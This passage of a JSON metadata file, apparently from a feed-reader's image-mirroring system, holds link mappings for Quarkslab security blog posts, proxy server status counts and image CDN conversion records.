attacks-with-qbdi.html#id8","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id9":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id9","http://blog.quarkslab.com/triton-v08-and-armv7-a-guideline-for-adding-new-architectures.html_#id3":"http://blog.quarkslab.com/triton-v08-and-armv7-a-guideline-for-adding-new-architectures.html#id3","http://blog.quarkslab.com/triton-v08-and-armv7-a-guideline-for-adding-new-architectures.html_#id2":"http://blog.quarkslab.com/triton-v08-and-armv7-a-guideline-for-adding-new-architectures.html#id2","http://blog.quarkslab.com/triton-v08-and-armv7-a-guideline-for-adding-new-architectures.html_#id1":"http://blog.quarkslab.com/triton-v08-and-armv7-a-guideline-for-adding-new-architectures.html#id1","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#phoenixaes":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#phoenixaes","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#eal":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#eal","http://blog.quarkslab.com/triton-v08-and-armv7-a-guideline-for-adding-new-architectures.html_#id4":"http://blog.quarkslab.com/triton-v08-and-armv7-a-guideline-for-adding-new-architectures.html#id4","http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html_#conclusion":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#conclusion","http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html_#monolithic-kernels-vs-micro-kernels":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#monolithic-kernels-vs-micro-kernels","http://blog.quarkslab.com/ansible-security-assessment.html_#id53":"http://blog.quarkslab.com/ansible-security-assessment.html#id53","http://blog.quarkslab.com/ansible-security-assessment.html_#id54":"http://blog.quarkslab.com/ansible-security-assessment.html#id54","http://blog.quarkslab.com/ansible-security-assessment.html_#cve-2020-1739":"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1739","http://blog.quarkslab.com/ansible-security-assessment.html_#id51":"http://blog.quarkslab.com/ansible-security-assessment.html#id51","http://blog.quarkslab.com/ansible-security-assessment.html_#cve-2020-1738":"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1738","http://blog.quarkslab.com/ansible-security-assessment.html_#id57":"http://blog.quarkslab.com/ansible-security-assessment.html#id57","http://blog.quarkslab.com/ansible-security-assessment.html_#id58":"http://blog.quarkslab.com/ansible-security-assessment.html#id58","http://blog.quarkslab.com/ansible-security-assessment.html_#id55":"http://blog.quarkslab.com/ansible-security-assessment.html#id55","http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html_#mitigations-and-security-practices":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#mitigations-and-security-practices","http://blog.quarkslab.com/ansible-security-assessment.html_#id56":"http://blog.quarkslab.com/ansible-security-assessment.html#id56","http://blog.quarkslab.com/ansible-security-assessment.html_#cve-2020-1733":"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1733","http://blog.quarkslab.com/ansible-security-assessment.html_#id59":"http://blog.quarkslab.com/ansible-security-assessment.html#id59","http://blog.quarkslab.com/ansible-security-assessment.html_#cve-2020-1737":"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1737","http://blog.quarkslab.com/ansible-security-assessment.html_#cve-2020-1736":"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1736","http://blog.quarkslab.com/ansible-security-assessment.html_#cve-2020-1735":"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1735","http://blog.quarkslab.com/ansible-security-assessment.html_#cve-2020-1734":"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1734","http://blog.quarkslab.com/phd-defense-of-jonathan-salwan-use-of-symbolic-execution-for-binary-deobfuscation.html_resources/2020-02-13-salwan-soutenance/salwan-slide-thesis.pdf":"http://blog.quarkslab.com/resources/2020-02-13-salwan-soutenance/salwan-slide-thesis.pdf","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#wookey":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#wookey","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html_resources/2020-06-30-samsung_trustzone_exploitation-part3/exploits/teeos.py":"http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/exploits/teeos.py","http://blog.quarkslab.com/ansible-security-assessment.html_#id50":"http://blog.quarkslab.com/ansible-security-assessment.html#id50","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html_#id24":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#id24","http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html_#hypervisor-vmcall-bug":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#hypervisor-vmcall-bug","http://blog.quarkslab.com/ansible-security-assessment.html_#id42":"http://blog.quarkslab.com/ansible-security-assessment.html#id42","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#aes-round":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#aes-round","http://blog.quarkslab.com/ansible-security-assessment.html_#id43":"http://blog.quarkslab.com/ansible-security-assessment.html#id43","http://blog.quarkslab.com/ansible-security-assessment.html_#id40":"http://blog.quarkslab.com/ansible-security-assessment.html#id40","http://blog.quarkslab.com/ansible-security-assessment.html_#id41":"http://blog.quarkslab.com/ansible-security-assessment.html#id41","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html_resources/2020-06-30-samsung_trustzone_exploitation-part3/exploits/secdriver.py":"http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/exploits/secdriver.py","http://blog.quarkslab.com/ansible-security-assessment.html_#id46":"http://blog.quarkslab.com/ansible-security-assessment.html#id46","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id33":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id33","http://blog.quarkslab.com/ansible-security-assessment.html_#id47":"http://blog.quarkslab.com/ansible-security-assessment.html#id47","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id34":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id34","http://blog.quarkslab.com/ansible-security-assessment.html_#id44":"http://blog.quarkslab.com/ansible-security-assessment.html#id44","http://blog.quarkslab.com/ansible-security-assessment.html_#id45":"http://blog.quarkslab.com/ansible-security-assessment.html#id45","http://blog.quarkslab.com/ansible-security-assessment.html_#id48":"http://blog.quarkslab.com/ansible-security-assessment.html#id48","http://blog.quarkslab.com/ansible-security-assessment.html_#id49":"http://blog.quarkslab.com/ansible-security-assessment.html#id49","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html_#sec-samsung-atf":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#sec-samsung-atf","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id30":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id30","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id31":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id31","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id32":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id32","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id26":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id26","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html_#ida-loader":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#ida-loader","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id27":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id27","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id28":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id28","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id29":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id29","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id22":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id22","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id23":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id23","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id24":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id24","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id25":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id25","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html_#teegris":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#teegris","http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html_resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/logs/ida_functions.txt":"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/logs/ida_functions.txt","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html_#id2":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#id2","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html_#id1":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#id1","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id20":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id20","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id21":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id21","http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html_#id11":"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id11","http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html_#id10":"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id10","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html_#id4":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#id4","http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html_#id12":"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id12","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html_#id3":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#id3","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id15":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id15","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id16":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id16","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id17":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id17","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id18":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id18","http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html_#usb-stack":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#usb-stack","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id11":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id11","http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html_#id9":"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id9","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id12":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id12","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#identify24":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#identify24","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id13":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id13","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id14":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id14","http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html_#syscalls":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#syscalls","http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html_#id6":"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id6","http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html_#id5":"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id5","http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html_#id8":"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id8","http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html_#id7":"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id7","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html_#unbox":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#unbox","http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html_#id2":"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id2","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id19":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id19","http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html_#bluetooth-stack":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#bluetooth-stack","http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html_#id1":"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id1","http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html_#id4":"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id4","http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html_#id3":"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id3"},"extra111_proxyServerAndStatMap":{"http://us-032.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[404]},"http://us-037.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-53.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://europe68.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-002.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe63.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-028.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-024.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-025.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-23.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://europe69.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-017.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe21.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-004.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe-57.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-003.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-008.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-22.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-016.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-013.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-018.herokuapp.com/":{"failCount":1,"successCount":1,"resultList":[404,200]},"http://us-039.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe65.herokuapp.com/":{"failCount":1,"successCount":2,"resultList":[200,200,404]},"http://us-55.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe61.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-035.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://europe66.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-022.herokuapp.com/":{"failCount":0,"successCount":5,"resultList":[200,200,200,200,200]},"http://us-030.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-009.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-026.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-006.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://europe-25.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-031.herokuapp.com/":{"failCount":1,"successCount":1,"resultList":[404,200]},"http://us-010.herokuapp.com/":{"failCount":1,"successCount":2,"resultList":[404,200,200]},"http://europe-59.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe67.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-51.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-023.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[404]},"http://us-014.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-027.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-12-jcop-pinlength-timing-attack/iso7816.png","sourceStatusCode":200,"destWidth":367,"destHeight":243,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn40@2020_3/2020/08/25/01-15-08-534_95d64cc484216a5b.webp","sourceBytes":24571,"destBytes":7944,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1178,"convertSpendMs":6,"createdTime":"2020-08-25 09:15:08","host":"europe61*","referer":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html","linkMd5ListStr":"45d86b363b28f0fc661f9ac9a1472981,45d86b363b28f0fc661f9ac9a1472981","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"24 KB","destSize":"7.8 KB","compressRate":"32.3%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-01-16_reversing-trimedia-part-3/tminstruction.png","sourceStatusCode":200,"destWidth":781,"destHeight":150,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn29@2020_1/2020/08/25/01-15-08-888_de1afb90eb844436.webp","sourceBytes":14851,"destBytes":23976,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1574,"convertSpendMs":14,"createdTime":"2020-08-25 09:15:08","host":"us-010*","referer":"http://blog.quarkslab.com/reverse-engineering-a-philips-trimedia-cpu-based-ip-camera-part-3.html","linkMd5ListStr":"83ba6cdf4912af08e5b4a404183a7181,83ba6cdf4912af08e5b4a404183a7181","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"14.5 KB","destSize":"23.4 KB","compressRate":"161.4%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/hypervisor-based_arch.png","sourceStatusCode":200,"destWidth":751,"destHeight":671,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn35@2020_6/2020/08/25/01-15-08-607_3219a6daa3b2006b.webp","sourceBytes":71750,"destBytes":55826,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1564,"convertSpendMs":35,"createdTime":"2020-08-25 09:15:08","host":"europe-23*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9,b2c23f95ebaba9ba1a3e978aafc827d9","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"70.1 KB","destSize":"54.5 KB","compressRate":"77.8%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/trustlet_vuln_memcpy_s7.png","sourceStatusCode":200,"destWidth":741,"destHeight":701,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn58@2020_2/2020/08/25/01-15-08-654_7b0da10a65302839.webp","sourceBytes":116645,"destBytes":42166,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1634,"convertSpendMs":21,"createdTime":"2020-08-25 09:15:08","host":"europe64*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html","linkMd5ListStr":"bcc1f00b70596b73ee173cdea133e02f,bcc1f00b70596b73ee173cdea133e02f","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"113.9 KB","destSize":"41.2 KB","compressRate":"36.1%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-03-23_mediatek-cve-2020-0069/rw_command.png","sourceStatusCode":200,"destWidth":851,"destHeight":494,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn28@2020_6/2020/08/25/01-15-09-010_c3c72a5c080ab1e2.webp","sourceBytes":41567,"destBytes":56684,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1793,"convertSpendMs":107,"createdTime":"2020-08-25 09:15:08","host":"us-009*","referer":"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html","linkMd5ListStr":"b5e122d24638afa80a92a8b4e06af637,b5e122d24638afa80a92a8b4e06af637","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"40.6 KB","destSize":"55.4 KB","compressRate":"136.4%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/monolithic.png","sourceStatusCode":200,"destWidth":721,"destHeight":351,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn65@2020_6/2020/08/25/01-15-09-174_c9a128020bf8fedc.webp","sourceBytes":47757,"destBytes":20376,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1840,"convertSpendMs":26,"createdTime":"2020-08-25 09:15:08","host":"us-029*","referer":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html","linkMd5ListStr":"49a8fa1929e7094fabb72d5aefec1af8,49a8fa1929e7094fabb72d5aefec1af8","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"46.6 KB","destSize":"19.9 KB","compressRate":"42.7%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-08-04-why-are-frida-and-qbdi-a-great-blend-on-android/graph.png","sourceStatusCode":200,"destWidth":512,"destHeight":606,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn50@2020_6/2020/08/25/01-15-09-208_00a4f0211b6c5799.webp","sourceBytes":90817,"destBytes":25004,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1887,"convertSpendMs":55,"createdTime":"2020-08-25 09:15:08","host":"us-013*","referer":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html","linkMd5ListStr":"5ae0c216fadd32ce30b31d6d084d735f,5ae0c216fadd32ce30b31d6d084d735f","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"88.7 KB","destSize":"24.4 KB","compressRate":"27.5%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/mordor2.jpg","sourceStatusCode":200,"destWidth":1164,"destHeight":480,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn44@2020_1/2020/08/25/01-15-09-144_f6b83c4ba2bd1686.webp","sourceBytes":111595,"destBytes":55270,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1912,"convertSpendMs":44,"createdTime":"2020-08-25 09:15:08","host":"us-018*","referer":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html","linkMd5ListStr":"430ebf87a477d97a275d0e53eefc4064,430ebf87a477d97a275d0e53eefc4064","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"109 KB","destSize":"54 KB","compressRate":"49.5%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-12-10-samsung_trustzone_exploitation_part2/script_before.png","sourceStatusCode":200,"destWidth":650,"destHeight":454,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn70@2020_4/2020/08/25/01-15-09-085_698244f85a1069e4.webp","sourceBytes":29223,"destBytes":45550,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1909,"convertSpendMs":16,"createdTime":"2020-08-25 09:15:08","host":"us-017*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-2.html","linkMd5ListStr":"67866c8423e15119961fa91dec078a96,67866c8423e15119961fa91dec078a96","githubUser":"myreaderx14","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"28.5 KB","destSize":"44.5 KB","compressRate":"155.9%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-28_ansible/ansible-architecture.png","sourceStatusCode":200,"destWidth":1596,"destHeight":1236,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn54@2020_3/2020/08/25/01-15-09-142_6b7893c403eaa2ea.webp","sourceBytes":160324,"destBytes":73468,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1977,"convertSpendMs":122,"createdTime":"2020-08-25 09:15:08","host":"us-001*","referer":"http://blog.quarkslab.com/ansible-security-assessment.html","linkMd5ListStr":"c919f76de397f905c0933c5249b3e20c,c919f76de397f905c0933c5249b3e20c","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"156.6 KB","destSize":"71.7 KB","compressRate":"45.8%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-11-26_legu_packer/packed_file.png","sourceStatusCode":200,"destWidth":804,"destHeight":473,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn61@2020_4/2020/08/25/01-15-09-485_4126435602f9a45d.webp","sourceBytes":288249,"destBytes":25554,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":2121,"convertSpendMs":141,"createdTime":"2020-08-25 09:15:08","host":"us-52*","referer":"http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html","linkMd5ListStr":"41cd2e745dd1c20533633d789273ed24,41cd2e745dd1c20533633d789273ed24","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"281.5 KB","destSize":"25 